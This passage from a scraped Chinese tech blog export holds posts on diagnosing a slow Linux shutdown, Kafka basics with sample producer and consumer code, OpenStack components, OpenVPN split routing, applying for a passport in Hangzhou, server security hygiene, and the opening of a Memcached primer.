17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x00000000bffdf000-0x00000000bfffffff] reserved Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x0000000100000000-0x000000083fffffff] usable Mar 23 17:07:57 live-linux-kc-403 kernel: NX (Execute Disable) protection: active 推断遇到这种问题只有该用户出现过，尚无其他案例，推测： 1.可能和 Tomcat 有关系，因为有大量内存泄露的日志信息；也有可能和 rsyslogd 服务有关系。2.排查了底层内核、CPU、在堆栈中都没发现异常现象，从云厂商的角度这属于系统层面的问题，应该由用户自行排查服务，比如这种想象是必现的可以看下关机前的资源利用率，看看是不是哪个进程占用资源高；在比如可以用排除法先取消 Tomcat 自启动后再尝试看看是否还会出现类似问题；另外可以谷歌搜下看看相关报错或根据关键词，例如 centos 7 重启卡住，我就查找到类似结果，例如： Tomcat 7/8都使用org.apache.catalina.util.SessionIdGeneratorBase.createSecureRandom类产生安全随机类SecureRandom的实例作为会话ID，这里花去了342秒，也即接近6分钟。参考这里 如果关机特别慢（甚至跟死机了一样），很可能是某个拒不退出的服务在作怪。systemd 会等待一段时间，然后再尝试杀死它。请阅读这篇文章，确认你是否是该问题受害者。 因为 rsyslogd 发送的信号是15，等于 kill -15 rsyslogdpid 而除了kill 除了 -9 是强制杀死进程的，其他都是有条件忽略的。比如上文中就说了: Just like with boot problems, when you encounter a hang during shutting down, make sure you wait at least 5 minutes to distinguish a permanent hang from a broken service that&apos;s just timing out. 所以这种系统进程的问题实在不是那么好排查，如实在无法解则迁移服务重装系统。毕竟这个只是影响关机时间，对服务没有影响。 从本问题来看影响的只是开机时间，对于系统内的服务影响基本没有。而该用户一直在和我们钻牛角尖说影响了他们的项目进度，没了这台服务器项目就无法进行了，其实我觉得这就是借口，希望把问题推到云服务商，为什么这么说： 1.首先，一个高可用的服务绝对不能出现单点故障，难道一天没解决，你项目就拖一天，不想其他办法解决了？况且我们对于云主机是有第三方说明的，哪些层面是我们可以排查和处理以及能负责的，哪些是用户自己排查和处理的，现在这个问题我们已经给出方向了是系统进程，可能是 Tomcat 也可能是 syslogd 服务有异常导致的问题。 2.此外在出现问题之前该用户根本就没想到去排查系统层面的日志和服务而是直接找我们处理，而到了我们给他们提供日志证明可能和 Tomcat 或 syslogd 服务 有关系时就开始拿一堆日志证明我们的推论是错误的。 3.该用户以往的故障申报情况看运维水平比较一般，设置自动挂载磁盘后卸载磁盘出现问题这种简单的错误都不知道怎么处理。 写在最后云厂商出售的只是硬件资源和网络资源，用户的业务场景使用系统千变万化，我们在出现问题时根本不知道用户在系统层面做了哪些操作，修改了哪些文件，改了哪些内核参数。这些未知的因素都会影响排查问题的准确性。因此没有任何一家云厂商敢做出承诺提用户进行运维故障排查操作。 就比如阿里云这样的大厂也不承诺同时也没有能力对于自己的所有用户的系统做代运维操作。如果有这能力，那千千万万的运维人员估计都要失业了吧！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"kafka 入门与实践","slug":"kafka-入门与实践","date":"2018-03-28T11:05:03.000Z","updated":"2021-02-26T06:05:29.275Z","comments":true,"path":"posts/46295.html","link":"","permalink":"https://awen.me/posts/46295.html","excerpt":"什么是 kafkakafka 是 Apache 基金会下的一个开源软件，它的主要作用是用于提供分布式流处理以及消息队列服务。 其官网 https://kafka.apache.org/ 最早是由 Linkedln 公司使用 scala 语言编写。","text":"什么是 kafkakafka 是 Apache 基金会下的一个开源软件，它的主要作用是用于提供分布式流处理以及消息队列服务。 其官网 https://kafka.apache.org/ 最早是由 Linkedln 公司使用 scala 语言编写。 特性 解耦：作为MQ，助力微服务(传统MQ更合适)。 冗余：提供数据冗余，高可用。 扩展性：简化应用扩展。 灵活性：访问量剧增时应用仍可发挥作用，减轻后端压力。 顺序保证：保证一个分区内消息的有序性。 缓冲：数据密度较大的在线处理中缓冲数据，如物联网，网站监控等。 高速写入：磁盘顺序写，而非随机写。 高可靠性：通过zk做分布式一致性，同步到任意多块磁盘上，故障自动切换选主，自愈。 高容量：通过横向扩展，LinkedIn每日通过Kafka存储的新增数据高达175TB，8000亿条消息。 应用场景 消息队列：场景和常见MQ相似。 行为跟踪：页面浏览、搜索等，实时记录到topic中，订阅者可用来实时监控或放到hadoop/离线仓库处理。 元数据监控：作为操作记录的监控模块，记录操作信息，类似运维性质的数据监控(审计)。 日志收集：收集服务器日志，交由文件服务器或hdfs处理。 流处理：接收流数据，提供给流式计算框架使用，多用于数据密度较大场景。 例如 分析用户行为，设计更好的广告位。 对用户搜索关键词进行统计，分析当前流行趋势。 监控用户行为，防止用户无限制抓取网站数据。 网站实时监控，获得实时性能数据，及时发出网站性能告警。 批量导入数据到hadoop/数据仓库，对数据离线分析，获取有价值的商业信息。 基本概念 Producer：消息和数据的生产者，数据向topic发布。 Consumer：消息和数据的消费者，订阅topic并处理消息。 Broker：Kafka集群中的服务器，producer-&gt;broker-&gt;consumer。 Topic：消息的分类。 Partition：topic物理上的分组，一个topic可有多个partition，partition为一个有序队列，每个 partition中的数据有序，每个消息会对应一个id(offset)。 Message：消息，通信基本单位。 流：一组从生产者移动到消费者的数据，kafka streams。 kafka 体系结构 Producer：消息的发布者 Consumer：消息的订阅者 Broker：中间的存储服务器 ProducerProducer将消息发布到指定的topic，同时producer可以决定消息归属于哪个partition，比如基于round-robin方式进行均匀分布。 可指定发布的分区，借助分区器+消息键实现消息均匀分布，可自定义分区器。 多个生产者可对应一个topic (如多个网页的监控对应一个topic)。 批量发送：Kafka producer的异步发送模式允许进行批量发送，先将消息缓存在内存中后一次性发出(对比redis pipeline)，多用在流处理。 BrokerBroker进行数据的缓存代理，Kafka集群中的一台或者多台服务器统称为broker。 Broker可为消息设置偏移量。 为减少磁盘写入次数，broker会将消息暂时缓存起来，当消息的个数(或空间)达到上限时再flush到磁盘，减少I/O调用。 Broker 无状态，不保存订阅者的状态，订阅者自己保存。 ConsumerConsumer从topic订阅并处理消息。 每个Consumer属于一个consumer group，发送到topic到消息只会被每个group中的一个consumer消费。 一个topic中一个partition只会被group中一个consumer消费，但一个consumer可以同时消费多个partition中的消息。 Kafka只保证一个topic下一个partition中的消息被某个consumer消费时消息是有序的，RabbitMQ天然有序。 每个group中不同consumer间消费独立。 对于一个topic，一个group中consumer数目不能大于partition个数。 Consumer Group对topic来说一个group就是一个”订阅者”，group作为一个整体对一个topic进行消费，不同group间独立订阅。 一个group内的consumer只能消费不同的partition。 Topictopic可以认为是一类消息。 每个topic划分为多个pattition。 每个partiton在存储层面表现为append log，发布到partition的消息被追加到log文件结尾。 消息在log文件中的位置称为offset。 PartitionPartition是topic上的物理分组。 分区目的：将log分散到多个broker上，保证 消费效率。多个partition对应多个consumer， 增加并发消费能力。 一个topic可以分为多个partition。 每个partition是一个有序队列。 Partition中每条消息对应一个id(offset)。 MessageMessage：通信的基本单位。 每个partition存储一部分message。 每条消息包含三个属性： Offset：long MessageSize：int32 Data：具体消息内容 OffsetOffset为消息在log文件中的位置(逻辑值)。 offset唯一标记一个partition中的一条消息，可理解为message的标识id。 消费者可将Offset可保存在zk或broker或本地。 消息的处理机制Kafka对消息的重复、顺序性没有严格要求。 Kafka提供at-least-once delivery机制，即consumer异常后，有些消息可能会被重复的delivery。 Kafka为每条消息进行CRC校验，用于错误检测，CRC不通过的消息会被丢弃。 事务非事务：”读取-&gt;处理-&gt;写入”中读写异步，流处理场景。 事务功能主要是一个服务端和协议级的功能，任何支持它的客户端库都可以使用它。 Kafka并未实现严格的”读取-&gt;处理-&gt;写入”的原子过程。 事务的机制主要exactly once实现，即消息只被发送一次，但目前只能保证读取的事务性，消费者一侧并未实现严格的事务性，按kafka的使用场景看也没必要实现。 安装安装 Java yum -y install javaKafka下载 wget -c http://apache.claz.org/kafka/1.0.0/kafka_2.11-1.0.0.tgz解压 tar zxvf kafka_2.11-1.0.0.tgz启动zk： bin/zookeeper-server-start.sh config/zookeeper.properties 启动kafka： bin/kafka-server-start.sh config/server.properties创建topic： bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic topic1 Created topic &quot;topic1&quot;.查看topic： bin/kafka-topics.sh --list --zookeeper localhost:2181启动producer： bin/kafka-console-producer.sh --broker-list localhost:9092 --topic topic1启动cousumer： bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic1 --from-beginningProducer发消息。 多节点：复制单节点配置文件，修改broker.id、监听端口、log路径即可。 与其他 MQ 比较 RabbitMQ：老牌MQ，应用较多，如OpenStack组件之间的通信，支持协议多，重量级消息队列，对路由、负载均衡、数据持久化支持很好，但无法适应持续产生的数据流，大量数据堆积时性能急剧下降。 ZeroMQ：号称最快的消息队列系统，擅长高级/复杂的队列，但使用也复杂，代码侵入，不提供持久化，只是一个库，相当于一个加强版的socket，与MQ区别较大。 Redis：Redis也有MQ功能，数据量小，数据大于10KB时基本异常慢，数据量小时性能优于RabbitMQ。 使用生成者 root@vpn:~# cat producer.py #/usr/bin/python3.5 # coding:utf-8 from kafka import KafkaProducer # 生产者 def producer_message(topic_name): producer = KafkaProducer(bootstrap_servers=[&quot;c-5jgvwkxjgd.kafka.cn-east-1.internal:9092&quot;]) for i in range(10000): message_string = &quot;msg%d&quot; %i response = producer.send(topic_name, message_string.encode(&apos;utf-8&apos;)) producer.close() producer_message(&apos;topic1&apos;)消费者 root@vpn:~# cat consumer.py #/usr/bin/python3.5 # coding:utf-8 from kafka import KafkaConsumer # 消费者 def consumer_message(topic_name): consumer = KafkaConsumer(topic_name,bootstrap_servers=[&quot;c-5jgvwkxjgd.kafka.cn-east-1.internal:9092&quot;]) for message in consumer: print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition, message.offset, message.key, message.value)) consumer_message(&apos;topic1&apos;)本文由王总整理。","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://awen.me/tags/kafka/"}]},{"title":"OpenStack 基本组件","slug":"OpenStack-基本组件","date":"2018-03-20T13:26:45.000Z","updated":"2021-02-26T06:05:29.261Z","comments":true,"path":"posts/33763.html","link":"","permalink":"https://awen.me/posts/33763.html","excerpt":"由来Openstack 最早由 NASA 研发，后加入 Apache 基金会 五大组件","text":"由来Openstack 最早由 NASA 研发，后加入 Apache 基金会 五大组件 核心组件 1.控制台 服务名称：Dashboard项目名称：Horizon提供的功能：web 方式管理云平台、建立云主机、安全组、云盘。 2.计算 服务名称：计算项目名称：Nova提供的功能： 负责响应虚拟机的创建、调度、销毁。 3.网络 服务名称：网络项目名称：Neutron提供的功能： 实现网络虚拟化，提供一整套 API，用户可以基于这套 API 定义专属网络，不同厂商之间可以基于此 API 提供自己的产品实现。 存储项目 1.对象存储 服务名：对象存储 项目名：Swift 功能：REST风格的接口和扁平的数据组织结构。RESTFUL HTTP API来保存和访问任意非结构化数据，ring环的方式实现数据自动复制和高度可以扩展架构，保证数据的高度容错和可靠性 2.块存储 服务名：块存储 项目名：Cinder 功能：提供持久化块存储，即为云主机提供附加云盘。 共享服务项目 1.认证服务 服务名：认证服务 项目名：Keystone 功能：为访问openstack各组件提供认证和授权功能，认证通过后，提供一个服务列表（存放你有权访问的服务），可以通过该列表访问各个组件。 2.镜像服务 服务名：镜像服务 项目名：Glance 功能：为云主机安装操作系统提供不同的镜像选择 3.计费服务 服务名：计费服务 项目名：Ceilometer 功能：收集云平台资源使用数据，用来计费或者性能监控 高层服务项目 1.编排服务 服务名：编排服务 项目名：Heat 功能：自动化部署应用，自动化管理应用的整个生命周期.主要用于Paas OpenStack 新建虚拟机流程 虚拟机启动过程如下： 界面或命令行通过RESTful API向keystone获取认证信息。 keystone通过用户请求认证信息，并生成auth-token返回给对应的认证请求。 界面或命令行通过RESTful API向nova-api发送一个boot instance的请求（携带auth-token）。 nova-api接受请求后向keystone发送认证请求，查看token是否为有效用户和token。 keystone验证token是否有效，如有效则返回有效的认证和对应的角色（注：有些操作需要有角色权限才能操作）。 通过认证后nova-api和数据库通讯。 初始化新建虚拟机的数据库记录。 nova-api通过rpc.call向nova-scheduler请求是否有创建虚拟机的资源(Host ID)。 nova-scheduler进程侦听消息队列，获取nova-api的请求。 nova-scheduler通过查询nova数据库中计算资源的情况，并通过调度算法计算符合虚拟机创建需要的主机。 对于有符合虚拟机创建的主机，nova-scheduler更新数据库中虚拟机对应的物理主机信息。 nova-scheduler通过rpc.cast向nova-compute发送对应的创建虚拟机请求的消息。 nova-compute会从对应的消息队列中获取创建虚拟机请求的消息。 nova-compute通过rpc.call向nova-conductor请求获取虚拟机消息。（Flavor） nova-conductor从消息队队列中拿到nova-compute请求消息。 nova-conductor根据消息查询虚拟机对应的信息。 nova-conductor从数据库中获得虚拟机对应信息。 nova-conductor把虚拟机信息通过消息的方式发送到消息队列中。 nova-compute从对应的消息队列中获取虚拟机信息消息。 nova-compute通过keystone的RESTfull API拿到认证的token，并通过HTTP请求glance-api获取创建虚拟机所需要镜像。 glance-api向keystone认证token是否有效，并返回验证结果。 token验证通过，nova-compute获得虚拟机镜像信息(URL)。 nova-compute通过keystone的RESTfull API拿到认证k的token，并通过HTTP请求neutron-server获取创建虚拟机所需要的网络信息。 neutron-server向keystone认证token是否有效，并返回验证结果。 token验证通过，nova-compute获得虚拟机网络信息。 nova-compute通过keystone的RESTfull API拿到认证的token，并通过HTTP请求cinder-api获取创建虚拟机所需要的持久化存储信息。 cinder-api向keystone认证token是否有效，并返回验证结果。 token验证通过，nova-compute获得虚拟机持久化存储信息。 nova-compute根据instance的信息调用配置的虚拟化驱动来创建虚拟机。 参考资料 视频教程 keystonekeystone 是 OpenStack 用来做认证的一个组件 基本概念User：指使用Openstack service的用户，可以是人、服务、系统，但凡使用了Openstack service的对象都可以称为User。 Project(Tenant)：可以理解为一个人、或服务所拥有的 资源集合 。在一个Project(Tenant)中可以包含多个User，每一个User都会根据权限的划分来使用Project(Tenant)中的资源。比如通过Nova创建虚拟机时要指定到某个Project中，在Cinder创建卷也要指定到某个Project中。User访问Project的资源前，必须要与该Project关联，并且指定User在Project下的Role。 Role：用于划分权限。可以通过给User指定Role，使User获得Role对应的操作权限。Keystone返回给User的Token包含了Role列表，被访问的Services会判断访问它的User和User提供的Token中所包含的Role。系统默认使用管理Role admin和成员Role member 。 Policy：OpenStack对User的验证除了OpenStack的身份验证以外，还需要鉴别User对某个Service是否有访问权限。Policy机制就是用来控制User对Tenant中资源(包括Services)的操作权限。对于Keystone service来说，Policy就是一个JSON文件，默认是/etc/keystone/policy.json。通过配置这个文件，Keystone Service实现了对User基于Role的权限管理。 Token：是一个字符串表示，作为访问资源的令牌。Token包含了在 指定范围和有效时间内 可以被访问的资源。EG. 在Nova中一个tenant可以是一些虚拟机，在Swift和Glance中一个tenant可以是一些镜像存储，在Network中一个tenant可以是一些网络资源。Token一般被User持有。 Credentials：用于确认用户身份的凭证 Authentication：确定用户身份的过程 Service：Openstack service，即Openstack中运行的组件服务。 Endpoint：一个可以通过网络来访问和定位某个Openstack service的地址，通常是一个URL。比如，当Nova需要访问Glance服务去获取image 时，Nova通过访问Keystone拿到Glance的endpoint，然后通过访问该endpoint去获取Glance服务。我们可以通过Endpoint的region属性去定义多个region。Endpoint 该使用对象分为三类： admin url –&gt; 给admin用户使用，Post：35357 internal url –&gt; OpenStack内部服务使用来跟别的服务通信，Port：5000 public url –&gt; 其它用户可以访问的地址，Post：5000 创建完service后创建API EndPoint. 在openstack中，每一个service都有三种end points. Admin, public, internal。 Admin是用作管理用途的，如它能够修改user/tenant(project)。 public 是让客户调用的，比如可以部署在外网上让客户可以管理自己的云。internal是openstack内部调用的。三种endpoints 在网络上开放的权限一般也不同。Admin通常只能对内网开放，public通常可以对外网开放internal通常只能对安装有openstack对服务的机器开放。 用户登录keystone系统（password或者token的方式），获取一个临时的token和catalog服务目录（v3版本登录时，如果没有指定scope，project或者domain，获取的临时token没有任何权限，不能查询project或者catalog）。 alice通过临时token获取自己的所有的project列表。 alice选定一个project，然后指定project重新登录，获取一个正式的token，同时获得服务列表的endpoint，用户选定一个endpoint，在HTTP消息头中携带token，然后发送请求（如果用户知道project name或者project id可以直接第3步登录）。 消息到达endpoint之后，由服务端（nova）的keystone中间件（pipeline中的filter：authtoken）向keystone发送一个验证token的请求。（token类型：uuid需要在keystone验证token，pki类型的token本身是包含用户详细信息的加密串，可以在服务端完成验证） keystone验证token成功之后，将token对应用户的详细信息，例如：role，username，userid等，返回给服务端（nova）。 服务端（nova）完成请求，例如：创建虚拟机。 服务端返回请求结果。 Glance Nova 和 cindernova主要组成: nova-api nova-scheduler nova-compute nova-conductorcinder主要组成: cinder-api cinder-scheduler cinder-volumecinder各组件功能： Cinder-api 是 cinder 服务的 endpoint，提供 rest 接口，负责处理 client 请求，并将 RPC 请求发送至 cinder-scheduler 组件。 Cinder-scheduler 负责 cinder 请求调度，其核心部分就是 scheduler_driver, 作为 scheduler manager 的 driver，负责 cinder-volume 具体的调度处理，发送 cinder RPC 请求到选择的 cinder-volume。 Cinder-volume 负责具体的 volume 请求处理，由不同后端存储提供 volume 存储空间。目前各大存储厂商已经积极地将存储产品的 driver 贡献到 cinder 社区","categories":[],"tags":[{"name":"OpenStack","slug":"OpenStack","permalink":"https://awen.me/tags/OpenStack/"}]},{"title":"OpenVPN 分流","slug":"OpenVPN-分流","date":"2018-03-19T04:04:09.000Z","updated":"2021-02-26T06:05:29.261Z","comments":true,"path":"posts/40068.html","link":"","permalink":"https://awen.me/posts/40068.html","excerpt":"默认配置的 OpenVPN 是所有流量都走 VPN 服务器的，但是我的需求是只希望操作内网服务器的流量才走 VPN，其他流量还是走默认的本地路由，所以可以对客户端或服务端增加参数，达到允许或不允许访问某些路由","text":"默认配置的 OpenVPN 是所有流量都走 VPN 服务器的，但是我的需求是只希望操作内网服务器的流量才走 VPN，其他流量还是走默认的本地路由，所以可以对客户端或服务端增加参数，达到允许或不允许访问某些路由 客户端配置主要由以下三个参数决定1.route-nopull当客户端加入这个参数后,openvpn 连接后不会添加路由,也就是不会有任何网络请求走openvpn. 2.vpn_gateway当客户端加入 route-nopull 后,所有出去的访问都不从 Openvpn 出去,但可通过添加 vpn_gateway参数使部分IP访问走 Openvpn 出去 route 192.168.1.0 255.255.0.0 vpn_gateway route 172.121.0.0 255.255.0.0 vpn_gateway3.net_gateway这个参数和 vpn_gateway 相反,表示在默认出去的访问全部走 Openvpn 时,强行指定部分IP访问不通过 Openvpn 出去.max-routes 参数表示可以添加路由的条数,默认只允许添加100条路由,如果少于100条路由可不加这个参数. max-routes 1000 route 172.121.0.0 255.255.0.0 net_gateway服务端增加 push &quot;route 172.16.0.0 255.255.0.0 vpn_gateway&quot;","categories":[],"tags":[]},{"title":"外地人在杭州如何办理护照","slug":"外地人在杭州如何办理护照","date":"2018-03-18T01:33:54.000Z","updated":"2021-02-26T06:05:29.323Z","comments":true,"path":"posts/12998.html","link":"","permalink":"https://awen.me/posts/12998.html","excerpt":"外地人在杭州也是可以办理护照的，不需要去老家办，而且我整个预约到办理大概只花了不到30分钟时间。下面分享下步骤：","text":"外地人在杭州也是可以办理护照的，不需要去老家办，而且我整个预约到办理大概只花了不到30分钟时间。下面分享下步骤： 预约微信关注杭州公安公众号，点击-微警务 然后选择出入境预约 然后根据自己的需求选择是是办护照还是签证，我只选了办理护照。资料填写完成后预约个时间去办理即可，我约的是周六，杭州现在周六周日都是上班的，这点要点个赞。 上门办理第一步，根据你预约的时间到对应的出入境大厅，如果是外地的，建议首先准备好最近一年的杭州社保清单，我是在竞舟路办理的，所以打印社保清单也是非常之方便。 第二步，然后到出入境大厅的填表机器上填表，主要是包括你要办理护照还是换护照然后填写邮件地址。 第三步，拍照 第四步，预检，工作人员会核对你的表格信息 盖个章，确认下你的户籍，如果是外地就要你拉社保清单，如果你是网上预约的出示短信，工作人员会给你个号，我是给完我号就叫到我的号了。 第五步，开始办理，这一步主要是录入指纹以及签字。 第六步，交钱，完成办理，我首次申请护照是160+快递费10块钱 一共170，都是明码标价的。 然后差不多等一个月的时间会快递给你。 有朋友说在老家办个护照要排队搞半天，我没去之前也担心会花很长时间结果不到半小时就搞定了，效率还是可以的。 十几天就到了。","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"https://awen.me/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"很烂的运维人员究竟能烂到什么程度","slug":"很烂的运维人员究竟能烂到什么程度","date":"2018-03-17T13:48:47.000Z","updated":"2021-02-26T06:05:29.334Z","comments":true,"path":"posts/25551.html","link":"","permalink":"https://awen.me/posts/25551.html","excerpt":"有个用户找我说他的 windows sever 2012 服务器 Administrator 账户被禁止了，排除了用户和同事禁止的可能，确认应该是被入侵了，但是线上的虚拟机不同于物理机没办法直接插 U 盘破解密码，比较麻烦，而且他也没有任何的备份，比如系统镜像或快照文件，所以这个客户我们建议他重装系统！ 但是这个用户似乎并不满足于我们提供的解决方案，反而很横的样子，似乎想把这个锅丢给云厂商，我有句卖吗批不知道当讲不当讲，很早之前我们就给他提过用一台服务器搭建 VPN 服务，通过 VPN 进行相关服务的连接，比如远程连接，但是他们并没有这么做。而是将远程端口直接暴露在公网上，另外我们的系统已经做了很多安全策略，比如禁止了137 139这些容易招黑的端口，但是这个用户非要用系统自带的文件共享服务，把他打开了，现在被黑了在要求我们提供解决方案，这就有点“扁鹊见蔡恒公”的意思了。","text":"有个用户找我说他的 windows sever 2012 服务器 Administrator 账户被禁止了，排除了用户和同事禁止的可能，确认应该是被入侵了，但是线上的虚拟机不同于物理机没办法直接插 U 盘破解密码，比较麻烦，而且他也没有任何的备份，比如系统镜像或快照文件，所以这个客户我们建议他重装系统！ 但是这个用户似乎并不满足于我们提供的解决方案，反而很横的样子，似乎想把这个锅丢给云厂商，我有句卖吗批不知道当讲不当讲，很早之前我们就给他提过用一台服务器搭建 VPN 服务，通过 VPN 进行相关服务的连接，比如远程连接，但是他们并没有这么做。而是将远程端口直接暴露在公网上，另外我们的系统已经做了很多安全策略，比如禁止了137 139这些容易招黑的端口，但是这个用户非要用系统自带的文件共享服务，把他打开了，现在被黑了在要求我们提供解决方案，这就有点“扁鹊见蔡恒公”的意思了。 这种被黑的系统如果不全格很有可能还会被再次感染，指不定就在其他盘里藏着木马病毒等你在装完系统又执行了。 在有些用户眼里，他们认为我花了买了你们的服务器和带宽的钱，后面我系统使用出现了任何问题都应该是你们负责。比如系统内的一些软件配置问题、操作系统日常维护问题都应该由云厂商负责，如果是这样的话，那一些公司还干嘛一个月好几万的工资请个运维人员，直接把这活丢给云厂商就好了啊！多省钱。 遇到这种用户最直接了当的方法就是告诉他服务界限，哪些服务是能提供的，哪些是不在服务条款内。打个比方，你从电信运营商那申请了宽带业务，运营商给你安装好了，后面具体你怎么用运营商会管你吗？除非是你无法上网了，可以打售后求助，但是如果你平时下个片啊、安装个软件之类的活都要运营商给你弄，你看运营商答应不答应？ 比如阿里云他只提供云计算服务，你买的云服务器本身出了问题可以找阿里云，系统内的各种自身业务运维服务如果你需要可以另外花钱买他们合作的驻云的运维，他们会给你搭建服务，后期维护。 在我眼里，所有只用 windows 系统当服务器的都被列入小白行列，至少我从业6年来遇到使用 windows 的用户的水平就都很菜，你还别不服气！就这种水平单位领导把服务器交你手上运维也只有被坑的份了。之前该用户说要开放 SMB 服务我就给他们提醒过这个容器被黑，不要开放给外网。还告诉了他比特币勒索病毒就是因为这个原因导致的，当然，该用户不以为然。 这说破天就是系统运维人员对于服务器安全不够重视或技术不到家。遇到这种运维人员首先就是公司招聘这样的人的人需要被开除了，其次就是尽快开除了让他回炉重造吧，如果还想继续干这行的话，别再祸害人了。 后来我们查出来是因为他的密码设置了过于简单，其实从日常与该用户的接触看就知道肯定会有这么一天。 那么接下来说点干货！ 目前几乎所有的云计算厂商都有提供 VPC 功能和安全组这种功能，前者是类似于给你分配一个路由器，你在这个路由器下面可以分配很多个子网 IP 地址，例如192.168.X.X；后者其实他本质就是类似于 windows 系统防火墙或 Linux 的 iptables 防火墙，你只需要把你的服务器加入到对应的安全组中，然后在安全组策略中设置只允许内网网段访问云服务器的一些重要的入网端口，比如 windows 远程端口默认是 3389，建议修改为默认端口为其他端口，例如修改为 55641，然后搭建个 VPN 做跳板机，通过跳板机的方式进行远程登录，这样的安全性是最高的，因为 VPN 可以有能力让你从本机连接到内网并且数据是加密的。 一般都强烈推荐所有的服务对外提供服务都要做好安全策略，比如修改默认服务端口以及只允许一些信任的的IP 或 IP 段访问，这样才能确保不会被随随便便一个不相干的人有权限进行入侵，把风险做到最低。 比如之前的比特币勒索时间就是因为全网扫描 windows 的 SMB 服务 445 端口，只要你的 445端口暴露在公网就有被入侵的机会。 在比如前段时间的 memcached 漏洞以及很早之前的 redis 被黑导致系统权限被拿到都是因为服务的权限设置不到位，安全措施设置不严格导致的。 建议除了必须要对外提供服务的业务之外，比如 web 服务，其他的服务都不应该直接让公网有能力访问，比如说数据库、远程访问终端或桌面（SSH VNC RDP 等），一般的安全的做法就是使用跳板机，通过跳板机登录服务器，服务器的远程服务也只提供给指定的设备访问，其他一律拒绝，并且做好人员的权限划分，不同的角色对于服务器的操作是一定要区分开的。当然也并不是说 web 服务就不需要做安全策略了，只是这个策略不在安全组或防火墙上做而是在 web 程序里面实现，比如说SQL注入啊、XSS 这些属于另外一个层次的话题了，这里不展开。 如果条件可以，还能加上堡垒机、审计等功能。 另外遇到有些客户感到很可笑我们为客户提供的 Linux 主机，设置了比密码更为安全的 SSH 密钥方式登录，禁止了密码直接登录系统，几乎业内的云厂商都是这样做的，比如阿里云，但是有些用户会把无知当自信，反而对我们这个设定感到非常的难以接受，非要使用密码，而这些用户一般设置的密码简单到简直能够让你怀疑人生，真的是众口难调。 从专业的角度来说，现在的普通密码登录方式是相当的不可靠的，首先普通人设置的密码无非就是电话号码、生日、身份证啊这些加点特殊字符，而且长度也最多十几位，太复杂了你也记不住。其次即使你的密码安全系统很高，但是有可能这个密码在其他地方用过已经被泄露了，俗称“撞库”，只要入侵者的计算机计算能力非常强密码库非常丰富，就很容易被暴力破解，如果系统不设置一些限制，比如说禁止同一个 IP 登录失败3次就拒绝2小时登录，就可以被无限次的尝试暴力破解，而 IP 请求源也是可以伪造的，通过代理的方式访问就可以绕过这一限制无限尝试，所以通过类似 SSH RSA 这种非对称的加密方式进行远程访问是非常有必要的，目前被破解的最长RSA密钥就是768位，而一些系统默认生成的 RSA 长度都是2048位，所以以目前的密码破解技术几乎被普通黑客破解的可能性没有，当然如果使用量子计算那估计只需要几秒时间吧，但是目前量子计算技术还在研究中，能掌握这个技术的都是大公司，比如谷歌。你认为谷歌会有这个精力拿这么先进的技术来黑你的电脑？这个成本也太高了点！ 被黑客入侵拿到控制权的电脑或服务器都被称为“肉鸡”，专门做这个的我们成为黑色产业链，简称“黑产”，他们的手里大概至少有上千上万台甚至数不胜数的肉鸡，他们拿这个肉鸡干嘛呢？比如说有人付钱给入侵者让他给某竞争对手的网站发起 DDOS 攻击，黑客就会操纵他的肉鸡同一时间去请求一个网站，耗尽其服务器的资源从而导致无法对其他正常用户提供访问能力。而这样很难追踪到攻击源，因为其IP都是分布在全世界各个地方的，所以你想想有多恐怖吧! 当然黑产是一个比较广泛的概念，上面的只是其中的很小一部分，再比如说黑客入侵了服务器后会把服务器上一些有利于价值的数据拖下来，这些数据里面包含了用户的邮箱啊、密码啊、身份证电话号码等重要敏感信息，然后通过数据分析得出一个人的画像实施针对性的诈骗或者出售个人信息给比如一些商家，你天天接到的骚扰电话可能就是这么个途径打来的。 假设你在 A 网站用了一样的注册信息和密码，B 网站有用了同样的注册信息和密码，那么当着2个网站都被黑客入侵了，黑客就相当于拿到了2份你的信息，进行比较合并后就更能了解你，可能比你妈还了解你。 所以我认为做一个合格的运维安全意识一定要放在第一位吧！其次是业务能力，运维追求的就是安全、稳定可靠、高可用、自动化。","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"https://awen.me/tags/windows/"}]},{"title":"Memcached 原理及最佳实践","slug":"Memcached-原理及最佳实践","date":"2018-03-16T23:54:20.000Z","updated":"2021-02-26T06:05:29.260Z","comments":true,"path":"posts/8943.html","link":"","permalink":"https://awen.me/posts/8943.html","excerpt":"什么是 MemcachedMemcached 是一个开源的、支持高性能高并发的分布式内存缓存系统，由 C 语言编写，共 2000多行代码。","text":"什么是 MemcachedMemcached 是一个开源的、支持高性能高并发的分布式内存缓存系统，由 C 语言编写，共 2000多行代码。 传统 mysql 保存数据，web 服务器从中读取数据并显示，但是数据量大并且访问集中的情况下，数据库会有瓶颈，导致网站延迟大，用户体验差。 memcached 能够将数据库的查询结果缓存到内存中，减少数据库被访问的次数，提高性能，通常来说会被频繁读取的数据都可以存到 memcached 中，因为内存的读写速度比磁盘快，但是 memcached 也并不是没有缺点的，内存大家都知道叫随机存储器，一旦关机或掉电数据就会全部丢失。 memcached 使用 key-value 对的形式存储数据，它在内存中缓存的数据就像一张巨大 hash 表。memcached 的 value 只支持 string 类型。 如何使用 memcached 减轻服务器压力？读取数据流程 1.web 程序首先检查客户端请求的数据是否存在 memcached 中，如果存在直接返回，不会去请求数据库。 2.如果请求的数据不在 memcached 中，则会去请求数据库，然后读取数据返回客户端，同时在把新数据缓存一份到 memcached 中。 更新数据流程1.当程序更新或删除数据库时，会首先处理后端数据库中的数据 2.在处理数据库中数据的同时，通知memcached，告诉它对应的旧数据失效，这样保证了2端数据的一致。3. 如果是高并发读写场合，除了要通知 memcached 过期的缓存失效，还要有相关通知机制来预热数据 图为 memcached 在企业 web 服务中的位置 特点和工作原理memcached 